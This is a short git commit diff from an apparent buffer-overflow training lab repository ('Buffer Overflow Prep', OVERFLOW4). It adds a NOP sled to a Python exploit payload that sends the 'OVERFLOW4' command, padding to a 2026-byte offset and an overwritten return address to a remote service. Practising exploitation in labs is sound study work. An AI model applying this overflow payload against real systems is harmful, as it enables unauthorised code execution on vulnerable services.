f769de4671f29f7356150c7c8861af1310f2a420
Imran Thoufeeque <75982271+I7Z3R0@users.noreply.github.com>
2021-09-26 09:08:21 +0530

    Update 6_nop_slid.py

--- Buffer Overflow Prep/OVERFLOW4/6_nop_slid.py
+++ Buffer Overflow Prep/OVERFLOW4/6_nop_slid.py
@@ -9,13 +9,15 @@ s = remote(host, port)
 total_length = 3000
 offset = 2026
 new_eip = p32(0x62501203)
+nop = b"\x90" * 10
 
 
 payload = [
     b"OVERFLOW4 ",
     b"A" * offset,
     new_eip,
-    b"C" * (total_length - offset - len(new_eip)),
+    nop,
+    b"C" * (total_length - offset - len(new_eip) - len(nop)),
 ]
 
 payload = b"".join(payload)
